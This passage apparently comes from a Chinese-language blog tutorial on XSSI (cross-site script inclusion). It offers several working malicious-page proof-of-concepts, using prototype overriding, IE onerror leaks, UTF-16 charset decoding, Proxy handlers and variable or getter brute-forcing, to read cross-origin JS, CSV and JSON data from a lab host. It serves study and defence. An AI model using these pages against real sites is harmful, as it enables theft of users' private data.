class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">String</span>.prototype.trim = <span class="function"><span class="keyword">function</span>(<span class="params">param</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="keyword">this</span>.toString();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> [<span class="literal">null</span>, <span class="keyword">this</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时能够成功窃取到数据：</p><p><img src="/2020/01/04/浅析XSSI漏洞/3.png" alt=""></p><h5 id="原型链分析"><a href="#原型链分析" class="headerlink" title="原型链分析"></a>原型链分析</h5><p>我们到浏览器的Console试下就知道。先看下String类型的原型链确实存在trim()这个内置函数，当然，如果含有敏感信息的String类型的局部变量调用了其他如下列出的内置方法我们都可以直接同理利用：</p><p><img src="/2020/01/04/浅析XSSI漏洞/4.png" alt=""></p><p>接着看下trim()内置方法的实现：</p><p><img src="/2020/01/04/浅析XSSI漏洞/5.png" alt=""></p><p>OK，现在我们知道目标JS中该String类型变量会调用trim()方法，那么我们就可以通过在我们的恶意页面来污染String原型链的trim()方法为我们自定义实现的方法，从而来窃取数据：</p><p><img src="/2020/01/04/浅析XSSI漏洞/6.png" alt=""></p><h5 id="Demo2-1"><a href="#Demo2-1" class="headerlink" title="Demo2"></a>Demo2</h5><p>较Demo1，使用了一个函数和toString方法。</p><p>secret.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> emails = [<span class="string">"123@123.com"</span>, <span class="string">"456@456.com"</span>];</span><br><span class="line">&#125;</span><br><span class="line">func.call();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>xssi.html，通过prototype将所有Functiorn的call方法重写，然后再调用.toString()方法将函数转换为字符串类型再读取内容，最后再引入产生数据泄露的脚本文件执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Function</span>.prototype.call = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> funcString = <span class="keyword">this</span>.toString();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> emails = /<span class="keyword">var</span> emails = \[(.*)\]/g.exec(funcString)[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">alert(emails);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里就不通过Jquery往标签中写内容了，因为这里污染了Function的原型链会让Jquery在执行时报错。修改成弹框显示就好：</p><p><img src="/2020/01/04/浅析XSSI漏洞/24.png" alt=""></p><h3 id="针对非JavaScript类型文件"><a href="#针对非JavaScript类型文件" class="headerlink" title="针对非JavaScript类型文件"></a>针对非JavaScript类型文件</h3><p>某些场景下，目标文件并未JS类型，包含敏感信息的文件，其中的内容并不能直接作为一个JS变量的值读取，或者文件内容是多行的，这些都会使得XSSI的信息窃取变得很困难。</p><p>下面先看下之前wooyun的文章中说到的方法，但都有些历史了，这里本地测试下看看是否还能成功。其中涉及到的文件类型包括CSV、JSON等。</p><h4 id="IE-bug导致错误信息泄漏"><a href="#IE-bug导致错误信息泄漏" class="headerlink" title="IE bug导致错误信息泄漏"></a>IE bug导致错误信息泄漏</h4><p>这种方法的局限性在于ie的版本要小于10，且目前的Chrome和Firefox都不能成功利用。除此之外，获取的CSV中的内容只能获取第一行、第二列的内容，并不能全部获取得到。</p><blockquote><p>为了防止js错误信息跨域泄漏，对于外部加载的js文件，现在主流的浏览器只有固定的错误信息，比如“script error”，但是在ie9与ie10，情况不一定如此。</p><p>一般来说，在外部js发生语法错误的情况下，浏览器只会提供固定的错误信息，但是当在runtime发生错误的情况下，浏览器会提供详细的错误信息。比如”foo 未定义”之类的，某些浏览器一旦允许外域js回复详细的错误信息，就会导致信息泄漏。</p><p>就是说，当某个网页的内容能被js识别为javascript格式的话，那么就可能通过错误信息获取到目标的内容。</p></blockquote><p>假设目标服务端存在包含敏感信息的a.csv：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure><p>用软件打开就是这样的：</p><p><img src="/2020/01/04/浅析XSSI漏洞/11.png" alt=""></p><p>xssi.html，设置window.error的错误显示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set an error handler --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;alert(err)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在ie 8上攻击利用，可以看到会显示CSV文件的第一行、第二列的内容：</p><p><img src="/2020/01/04/浅析XSSI漏洞/12.png" alt=""></p><p>出现这种情况的原因在于，浏览器将目标CSV文件内容识别为JavaScript，其中age被识别为某个未定义的JS变量。当为这种情况的时候，浏览器就允许页面捕捉来自不同网页的错误信息。</p><p>在Chrome和Firefox，以及10版本以上的ie都不能成功。比如Firefox中并不会弹框，而是直接被浏览器拦截了获取CSV类型的响应：</p><p><img src="/2020/01/04/浅析XSSI漏洞/13.png" alt=""></p><h4 id="UTF-16编码窃取敏感信息"><a href="#UTF-16编码窃取敏感信息" class="headerlink" title="UTF-16编码窃取敏感信息"></a>UTF-16编码窃取敏感信息</h4><p>这种方法突破了前面只能对CSV信息进行窃取的尴尬局面，但局限性和前面的方法一样，仅在ie &lt; 10的版本下才能成功利用，因为ie 10会拒绝将没有空字节活着bom的编码为UTF-16。</p><p>这种方法的原理如下：</p><blockquote><p>使用<code>script</code>标签的<code>charset</code>属性将包含的文件编码为UTF-16，其目的在于强制文件的所有内容连为一体，变为一个未定义的Javascript变量。然后通过在window域内使用<code>onerror</code>捕获错误信息（此错误信息一定为<code>已编码的文件内容 is not defined</code>），再进行解码即可。此举其实是为了防止符号会引起Javascript出现其他异常，例如英文逗号会截断文件内容，报错只会显示逗号前的内容未定义；而中文逗号则会直接提示非法字符，从而获取不到任何敏感信息。</p></blockquote><p>a.json，假设的目标服务端保存着敏感数据的Json文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"username"</span>:<span class="string">"admin"</span>, <span class="attr">"token"</span>:<span class="string">"89uki4gk9iu9213trju"</span>&#125;</span><br></pre></td></tr></table></figure><p>xssi.html，在script标签中加入charset=”UTF-16BE”，同时通过window.error来捕获错误信息并弹框显示出来：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set an error handler --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;alert(err)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target JSON --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.json"</span> <span class="attr">charset</span>=<span class="string">"UTF-16BE"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地使用ie 8进行测试，弹框显示一段乱码内容，并识别该乱码为JS变量未定义：</p><p><img src="/2020/01/04/浅析XSSI漏洞/7.png" alt=""></p><p>乱码内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">笢畳敲湡浥∺≡摭楮∬•瑯步渢㨢㠹畫椴杫㥩甹㈱㍴牪產</span><br></pre></td></tr></table></figure><p>将这堆乱码再进行UTF-16BE编码等操作即可获取到原始内容·：</p><p><img src="/2020/01/04/浅析XSSI漏洞/8.png" alt=""></p><p>注意，这种方式成功的前提在于浏览器是否会将编码后的内容识别为JS的变量，若不能则无法利用成功。除了IE 10以上的版本，在当前的Chrome和Firefox中都是不能成功的，这是因为浏览器并未将编码后的内容识别为JS变量，自然而然地也就无法从window.error中捕获到乱码信息了：</p><p><img src="/2020/01/04/浅析XSSI漏洞/9.png" alt=""></p><p>下图是引自wooyun文章，能够被浏览器认定为有效的JS变量，当字符编码为UTF-16的时候的数字字母组合，ie 9将其99.3%认为是有效的js标示符，高于Chrome和Firefox：</p><p><img src="/2020/01/04/浅析XSSI漏洞/10.png" alt=""></p><h4 id="Harmony-proxy-bug-in-Firefox-Chrome"><a href="#Harmony-proxy-bug-in-Firefox-Chrome" class="headerlink" title="Harmony proxy bug in Firefox / Chrome"></a>Harmony proxy bug in Firefox / Chrome</h4><blockquote><p>Harmony是一个ECMAScript 6中的新功能，类似于Java的反射类，其中定义了对于对象属性的查找、分配、函数调用，在我们针对这些新特性的研究过程中发现该功能可以用于XSSI的攻击中。</p></blockquote><p>注意，这种方法在当前较新版本的Chrome和Firefox中都以失效。</p><p>和前面一样的a.csv：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure><p>xssi.html，其中<code>window.__proto__</code>定义了一个代理对象，当访问一个未定义的全局变量，就会出发handler进行处理：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set proxy handler to window.__proto__ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> handler = &#123;</span></span><br><span class="line"><span class="actionscript">has: <span class="function"><span class="keyword">function</span><span class="params">(target, name)</span> </span>&#123;alert(<span class="string">"data="</span> + name); <span class="keyword">return</span> <span class="literal">true</span>&#125;,</span></span><br><span class="line"><span class="actionscript"><span class="keyword">get</span>: <span class="function"><span class="keyword">function</span><span class="params">(target, name)</span> </span>&#123;<span class="keyword">return</span> <span class="number">1</span>&#125;</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.__proto__ = <span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, handler);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在本地测试没成功，显示不能给该对象设置prototype：</p><p><img src="/2020/01/04/浅析XSSI漏洞/14.png" alt=""></p><h4 id="穷举搜索"><a href="#穷举搜索" class="headerlink" title="穷举搜索"></a>穷举搜索</h4><p>穷举搜索简单地说就是在客户端使用某些方法来暴力破解目标文件中的敏感数据，分为下面三种类型。</p><h5 id="定义变量穷举CSV内容"><a href="#定义变量穷举CSV内容" class="headerlink" title="定义变量穷举CSV内容"></a>定义变量穷举CSV内容</h5><p>此方法适用于当前所有IE版本。</p><p>在前面IE Bug小节中说到了利用IE的Bug可以获取CSV中的第一行第二列的内容，这是因为IE浏览器将该内容当成JS变量然后报错显示错误信息导致信息泄露。现在这种方法的原理在于，我们在恶意页面中就穷举定义CSV中可能存在的项的内容，如果穷举成功、定义了该CSV项的值的变量，那么浏览器就不会报错，证明我们穷举成功。</p><p>在前面的基础上，我们可以通过定义变量的方式来穷举CSV中的所有内容（这里数值无法定义变量也就无法穷举出其值），同时也解决了一般情况下浏览器不提供详细的外部错误信息的问题，这样，即使在最新版的IE 11也能够成功进行利用。</p><p>假设a.csv如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure><p>xssi.html，先啥变量都不定义：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时会报age未定义，也就是CSV中的第一行第二列的内容，和前面的一样：</p><p><img src="/2020/01/04/浅析XSSI漏洞/16.png" alt=""></p><p>接着，修改xssi.html，添加age变量的定义：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时发现和前面的报错是一样的。没关系，我们直接修改xssi.html，添加age前面的name的变量的定义，发现报错信息就会往后识别了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> name = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/2020/01/04/浅析XSSI漏洞/17.png" alt=""></p><p>根据这个原理，我们就可以对CSV文件中的每一项的内容进行穷举，直至浏览器无报错时即穷举完成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> name = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> address = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> mi1k7ea = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> china = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/2020/01/04/浅析XSSI漏洞/18.png" alt=""></p><p>值得注意的是，CSV中的项若为数值，则无需我们定义该数值的变量、也无法定义该变量，换句话说，这种方式除了CSV中的数值项、其他的全部内容都能够被成功穷举出来。</p><h5 id="JS-getter穷举CSV内容"><a href="#JS-getter穷举CSV内容" class="headerlink" title="JS getter穷举CSV内容"></a>JS getter穷举CSV内容</h5><p>原理和上一小节定义变量大同小异，只是借助了JavaScript的getter方法来实现。</p><p>此方法同样适用于当前所有IE版本。</p><p>a.csv如上。</p><p>xssi.html，穷举过程和前面的类似，这里先对CVS中的几项进行定义穷举：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"name"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=name"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"age"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=age"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"address"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=address"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>要是文件中每一项的内容被定义成功，则会逐个弹框显示出来，并且浏览器最后会报错有些像还未定义，当然显不显示具体的未定义的项的内容得看浏览器：</p><p><img src="/2020/01/04/浅析XSSI漏洞/19.png" alt=""></p><p><img src="/2020/01/04/浅析XSSI漏洞/20.png" alt=""></p><p>接着和前面小节一样，继续通过JS的getter来穷举出CSV文件内容中的其他项即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span 